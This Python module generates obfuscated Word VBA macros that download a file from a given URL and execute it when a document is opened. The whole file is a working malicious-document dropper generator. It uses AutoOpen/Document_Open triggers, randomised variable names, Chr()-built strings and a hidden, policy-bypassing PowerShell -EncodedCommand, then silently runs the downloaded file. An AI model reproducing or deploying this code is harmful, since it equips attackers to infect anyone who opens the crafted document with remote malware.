import os
import base64
import random
import string

metadata = {
    "name": "DownloadAndExecute_Obfuscated",
    "description": "Downloads a file from a URL and executes it using obfuscated PowerShell commands.",
    "parameters": ["url", "method"]
}

def random_var(prefix="v"):
    return prefix + ''.join(random.choices(string.ascii_letters, k=6))

def split_vba_string(s, max_len=200):
    lines = [s[i:i+max_len] for i in range(0, len(s), max_len)]
    return '" & _\n          "'.join(lines)

def generate_macro_code(params):
    url = params["url"]
    method = params["method"].lower()
    filename = os.path.basename(url)

    if method == "webclient":
        ps_payload = f"(New-Object System.Net.WebClient).DownloadFile('{url}', '{filename}')"
    elif method == "iwr":
        ps_payload = f"Invoke-WebRequest -Uri '{url}' -OutFile '{filename}'"
    else:
        raise ValueError("Unsupported method. Use 'webclient' or 'iwr'.")

    # Encode PowerShell in UTF-16LE for -EncodedCommand
    encoded = base64.b64encode(ps_payload.encode("utf-16le")).decode()
    vba_encoded = split_vba_string(encoded)

    # Obfuscated variable names
    var_cmd = random_var()
    var_p1 = random_var()
    var_p2 = random_var()
    var_encoded = random_var()
    var_exe = random_var()
    var_wait = random_var()
    var_chk = random_var()

    return f'''
Sub AutoOpen()
    Call {var_p1}
End Sub

Sub Document_Open()
    Call {var_p1}
End Sub

Sub {var_p1}()
    Dim {var_encoded} As String
    {var_encoded} = "{vba_encoded}"

    Dim {var_p2} As String
    {var_p2} = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)

    Dim {var_cmd} As String
    {var_cmd} = {var_p2} & " -nop -w hidden -noni -ep bypass -EncodedCommand " & {var_encoded}
    Shell {var_cmd}, vbHide

    Dim {var_exe} As String
    {var_exe} = ActiveDocument.Path & "\\" & "{filename}"

    ' Wait until file exists before execution
    Do While Dir({var_exe}) = ""
        DoEvents
    Loop

    Call {var_wait}(2)
    Shell {var_exe}, vbHide
End Sub

Sub {var_wait}(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
'''

